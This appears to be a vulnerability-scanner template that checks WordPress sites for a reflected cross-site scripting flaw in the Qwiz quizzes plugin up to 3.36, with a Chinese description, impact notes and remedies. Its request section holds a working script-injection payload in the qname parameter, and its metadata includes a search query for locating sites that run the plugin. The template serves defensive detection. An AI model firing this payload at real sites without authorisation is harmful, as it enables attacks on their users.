id: wp-qwiz-online-xss

info:
  name: Qwiz Online Quizzes And Flashcards <= 3.36 - 跨站脚本漏洞
  author: r3Y3r53
  severity: medium
  description: |
    该模板用于检测 Qwiz Online Quizzes And Flashcards <= 3.36 - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/wp-content/plugins/qwiz-online-quizzes-and-flashcards/registration_complete.php?&qname=%3C/s...` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://wpscan.com/vulnerability/d3c10f69-87b6-43fd-bcbc-c2d35b683ff4
    - https://packetstormsecurity.com/files/154403/
    - https://wordpress.org/plugins/qwiz-online-quizzes-and-flashcards/
  metadata:
    verified: true
    max-request: 1
    publicwww-query: "/wp-content/plugins/qwiz-online-quizzes-and-flashcards/"
  tags: wordpress,wp-plugin,wpscan,packetstorm,qwiz-online-quizzes-and-flashcards,xss,vuln

http:
  - raw:
      - |
        GET /wp-content/plugins/qwiz-online-quizzes-and-flashcards/registration_complete.php?&qname=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains_all(body, "quizzes/flashcard", "</script><script>alert(document.domain)</script>")'
        condition: and
